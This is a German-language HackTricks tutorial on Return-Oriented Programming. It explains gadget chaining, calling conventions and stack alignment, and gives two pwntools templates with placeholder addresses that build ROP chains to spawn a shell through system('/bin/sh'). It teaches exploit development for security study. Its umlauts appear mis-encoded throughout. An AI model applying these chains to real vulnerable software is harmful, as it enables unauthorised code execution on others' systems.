# ROP - Return Oriented Programing

{% hint style="success" %}
Lernen Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
{% endhint %}

## **Grundlegende Informationen**

**Return-Oriented Programming (ROP)** ist eine fortgeschrittene Exploitation-Technik, die verwendet wird, um Sicherheitsma√ünahmen wie **No-Execute (NX)** oder **Data Execution Prevention (DEP)** zu umgehen. Anstatt Shellcode einzuspeisen und auszuf√ºhren, nutzt ein Angreifer Codefragmente, die bereits in der Bin√§rdatei oder in geladenen Bibliotheken vorhanden sind, bekannt als **"Gadgets"**. Jedes Gadget endet typischerweise mit einer `ret`-Anweisung und f√ºhrt eine kleine Operation aus, wie das Verschieben von Daten zwischen Registern oder das Ausf√ºhren von arithmetischen Operationen. Indem ein Angreifer diese Gadgets miteinander verkn√ºpft, kann er eine Nutzlast konstruieren, um beliebige Operationen auszuf√ºhren und somit NX/DEP-Schutzmechanismen zu umgehen.

### Funktionsweise von ROP

1. **Kontrollfluss-Hijacking**: Zun√§chst muss ein Angreifer den Kontrollfluss eines Programms hijacken, typischerweise durch Ausnutzen eines Puffer√ºberlaufs, um eine gespeicherte R√ºcksprungadresse auf dem Stack zu √ºberschreiben.
2. **Gadget-Verkettung**: Der Angreifer w√§hlt und verkn√ºpft sorgf√§ltig Gadgets, um die gew√ºnschten Aktionen auszuf√ºhren. Dies k√∂nnte das Einrichten von Argumenten f√ºr einen Funktionsaufruf, den Aufruf der Funktion (z. B. `system("/bin/sh")`) und die Behandlung von erforderlichen Bereinigungen oder zus√§tzlichen Operationen umfassen.
3. **Ausf√ºhrung der Nutzlast**: Wenn die verwundbare Funktion zur√ºckkehrt, beginnt sie anstelle einer legitimen Position mit der Ausf√ºhrung der Kette von Gadgets.

### Tools

Typischerweise k√∂nnen Gadgets mithilfe von [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) oder direkt von **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)) gefunden werden.

## ROP-Kette im x86-Beispiel

### **x86 (32-Bit) Aufrufkonventionen**

* **cdecl**: Der Aufrufer bereinigt den Stack. Funktionsargumente werden in umgekehrter Reihenfolge (von rechts nach links) auf den Stack geschoben. **Argumente werden von rechts nach links auf den Stack geschoben.**
* **stdcall**: √Ñhnlich wie cdecl, aber der Callee ist f√ºr das Bereinigen des Stacks verantwortlich.

### **Auffinden von Gadgets**

Angenommen, wir haben die erforderlichen Gadgets in der Bin√§rdatei oder in ihren geladenen Bibliotheken identifiziert. Die Gadgets, an denen wir interessiert sind, sind:

* `pop eax; ret`: Dieses Gadget poppt den obersten Wert des Stacks in das `EAX`-Register und gibt dann zur√ºck, was es uns erm√∂glicht, `EAX` zu kontrollieren.
* `pop ebx; ret`: √Ñhnlich wie oben, aber f√ºr das `EBX`-Register, was die Kontrolle √ºber `EBX` erm√∂glicht.
* `mov [ebx], eax; ret`: Bewegt den Wert in `EAX` an die Speicherstelle, auf die `EBX` zeigt, und gibt dann zur√ºck. Dies wird oft als **write-what-where-Gadget** bezeichnet.
* Zus√§tzlich haben wir die Adresse der Funktion `system()` verf√ºgbar.

### **ROP-Kette**

Mit **pwntools** bereiten wir den Stack f√ºr die Ausf√ºhrung der ROP-Kette wie folgt vor, um `system('/bin/sh')` auszuf√ºhren. Beachten Sie, wie die Kette beginnt mit:

1. Eine `ret`-Anweisung zu Ausrichtungszwecken (optional)
2. Adresse der Funktion `system` (unter der Annahme, dass ASLR deaktiviert ist und die libc bekannt ist, weitere Informationen in [**Ret2lib**](ret2lib/))
3. Platzhalter f√ºr die R√ºcksprungadresse von `system()`
4. `"/bin/sh"`-String-Adresse (Parameter f√ºr die Systemfunktion)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP-Kette im x64-Beispiel

### **x64 (64-Bit) Aufrufkonventionen**

* Verwendet die **System V AMD64 ABI** Aufrufkonvention auf Unix-√§hnlichen Systemen, bei der die **ersten sechs Integer- oder Zeigerargumente in den Registern `RDI`, `RSI`, `RDX`, `RCX`, `R8` und `R9` √ºbergeben werden**. Zus√§tzliche Argumente werden auf dem Stack √ºbergeben. Der R√ºckgabewert wird in `RAX` platziert.
* Die **Windows x64** Aufrufkonvention verwendet `RCX`, `RDX`, `R8` und `R9` f√ºr die ersten vier Integer- oder Zeigerargumente, wobei zus√§tzliche Argumente auf dem Stack √ºbergeben werden. Der R√ºckgabewert wird in `RAX` platziert.
* **Register**: 64-Bit-Register umfassen `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` und `R8` bis `R15`.

#### **Gadgets finden**

F√ºr unseren Zweck konzentrieren wir uns auf Gadgets, die es uns erm√∂glichen, das **RDI**-Register zu setzen (um den **"/bin/sh"**-String als Argument an **system()** zu √ºbergeben) und dann die **system()**-Funktion aufzurufen. Wir nehmen an, dass wir die folgenden Gadgets identifiziert haben:

* **pop rdi; ret**: Pusht den obersten Wert des Stacks in **RDI** und gibt dann zur√ºck. Wesentlich f√ºr die Festlegung unseres Arguments f√ºr **system()**.
* **ret**: Ein einfacher R√ºckgabewert, n√ºtzlich f√ºr die Stackausrichtung in einigen Szenarien.

Und wir kennen die Adresse der **system()**-Funktion.

### **ROP-Kette**

Im Folgenden finden Sie ein Beispiel, das **pwntools** verwendet, um eine ROP-Kette einzurichten und auszuf√ºhren, die darauf abzielt, **system('/bin/sh')** auf **x64** auszuf√ºhren:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
### Stack Alignment

**Die x86-64 ABI** stellt sicher, dass der **Stack 16-Byte ausgerichtet** ist, wenn eine **call-Anweisung** ausgef√ºhrt wird. **LIBC** verwendet zur Leistungssteigerung **SSE-Anweisungen** (wie **movaps**), die diese Ausrichtung erfordern. Wenn der Stack nicht ordnungsgem√§√ü ausgerichtet ist (was bedeutet, dass **RSP** kein Vielfaches von 16 ist), schlagen Aufrufe von Funktionen wie **system** in einer **ROP-Kette** fehl. Um dies zu beheben, f√ºgen Sie einfach ein **ret-Gadget** vor dem Aufruf von **system** in Ihrer ROP-Kette hinzu.

## Hauptunterschied zwischen x86 und x64

{% hint style="success" %}
Da **x64 Register f√ºr die ersten Argumente verwendet**, erfordert es oft weniger Gadgets als x86 f√ºr einfache Funktionsaufrufe, aber das Finden und Verketten der richtigen Gadgets kann aufgrund der erh√∂hten Anzahl von Registern und des gr√∂√üeren Adressraums komplexer sein. Die erh√∂hte Anzahl von Registern und der gr√∂√üere Adressraum in der **x64**-Architektur bieten sowohl M√∂glichkeiten als auch Herausforderungen f√ºr die Exploit-Entwicklung, insbesondere im Kontext des Return-Oriented Programming (ROP).
{% endhint %}

## ROP-Kette im ARM64-Beispiel

### **ARM64-Grundlagen & Aufrufkonventionen**

√úberpr√ºfen Sie die folgende Seite f√ºr diese Informationen:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}



## Schutzma√ünahmen gegen ROP

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **&** [**PIE**](../common-binary-protections-and-bypasses/pie/): Diese Schutzma√ünahmen erschweren die Verwendung von ROP, da sich die Adressen der Gadgets zwischen den Ausf√ºhrungen √§ndern.
* [**Stack-Canaries**](../common-binary-protections-and-bypasses/stack-canaries/): Bei einem BOF ist es erforderlich, den gespeicherten Stack-Canary zu umgehen, um R√ºckgabepunkte zu √ºberschreiben und eine ROP-Kette zu missbrauchen.
* **Mangel an Gadgets**: Wenn nicht gen√ºgend Gadgets vorhanden sind, ist es nicht m√∂glich, eine ROP-Kette zu generieren.

## Auf ROP basierende Techniken

Beachten Sie, dass ROP nur eine Technik ist, um beliebigen Code auszuf√ºhren. Basierend auf ROP wurden viele Ret2XXX-Techniken entwickelt:

* **Ret2lib**: Verwenden Sie ROP, um beliebige Funktionen aus einer geladenen Bibliothek mit beliebigen Parametern aufzurufen (normalerweise etwas wie `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Verwenden Sie ROP, um einen Aufruf an ein Systemaufruf vorzubereiten, z.B. `execve`, und f√ºhren Sie damit beliebige Befehle aus.

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

* **EBP2Ret & EBP-Chaining**: Ersteres wird EBP anstelle von EIP missbrauchen, um den Fluss zu steuern, und das zweite ist √§hnlich wie Ret2lib, aber in diesem Fall wird der Fluss haupts√§chlich mit EBP-Adressen gesteuert (obwohl es auch erforderlich ist, EIP zu steuern).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## Weitere Beispiele & Referenzen

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 Bit, Pie und nx aktiviert, kein Canary, √ºberschreiben von RIP mit einer `vsyscall`-Adresse mit dem alleinigen Zweck, zur n√§chsten Adresse im Stack zur√ºckzukehren, die eine teilweise √úberschreibung der Adresse ist, um den Teil der Funktion zu erhalten, der die Flagge preisgibt
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* Arm64, kein ASLR, ROP-Gadget, um den Stack ausf√ºhrbar zu machen und zu Shellcode im Stack zu springen

{% hint style="success" %}
Lernen & √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}
